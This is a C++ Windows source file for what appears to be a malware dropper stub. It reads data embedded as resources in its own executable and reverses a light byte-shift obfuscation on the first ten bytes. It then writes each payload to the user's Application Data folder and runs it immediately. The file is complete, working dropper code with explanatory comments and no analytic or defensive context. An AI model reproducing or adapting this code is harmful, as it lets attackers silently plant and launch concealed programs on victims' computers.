#include <windows.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <vector>
#include <iostream>

using namespace std;

void RunFile(char *filename)
{
    ShellExecute(NULL, "open", filename, NULL, NULL, SW_SHOWNORMAL); // Runs dropped files
}

BOOL EnumNamesFunc(HMODULE hModule, LPCTSTR lpType, LPTSTR lpName, LONG lParam) {

	HRSRC hResource;
    HANDLE hResourceLoaded;
    LPBYTE lpBuffer;
	
    hResource = FindResource(NULL, lpName, lpType); // Looks for resource in the current file handle. Resource is raw data
   	if (hResource == NULL) return false;

	DWORD dwFileSize, dwBytesWritten;
	HANDLE hFile;

	dwFileSize = SizeofResource(NULL, hResource); // Finds size of the data to be written to file.
	lpBuffer = new BYTE[dwFileSize];

	hResourceLoaded = LoadResource(NULL, hResource); // Loads the resource of the given file handle and resource name, specified previously by LoadLibrary and FindResource
	if (hResourceLoaded == NULL) return false;
	
	lpBuffer = (LPBYTE)LockResource(hResourceLoaded); // Returns first byte of resource data
    if (lpBuffer == NULL) return false;

	vector<BYTE> vBuffer (lpBuffer, lpBuffer + dwFileSize);

	// Decrypt first 10 bytes
	for (int i=0; i < 10; i++) {
		vBuffer[i] = vBuffer[i] + 1;
	}

	// Replace the * with .
	string Name = lpName;
	Name = Name.replace(Name.find_last_of("*"), 1, ".");
	lpName = new char[Name.length() + 1];
	strcpy(lpName, Name.c_str());

	char apppath[MAX_PATH];
	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, apppath); // Gets 'Application Data' folders path
	strcat(apppath, "\\");
	strcat(apppath, lpName); // Final temporary path of file

	hFile = CreateFile(apppath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		WriteFile(hFile, &vBuffer[0], dwFileSize, &dwBytesWritten, NULL);
		CloseHandle(hFile);
		RunFile(apppath);
	}

    return true;
}

int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance, LPSTR lpszArgument, int nFunsterStil) {

   	EnumResourceNames(NULL, RT_RCDATA, (ENUMRESNAMEPROC)EnumNamesFunc, 0);
    return 0;

}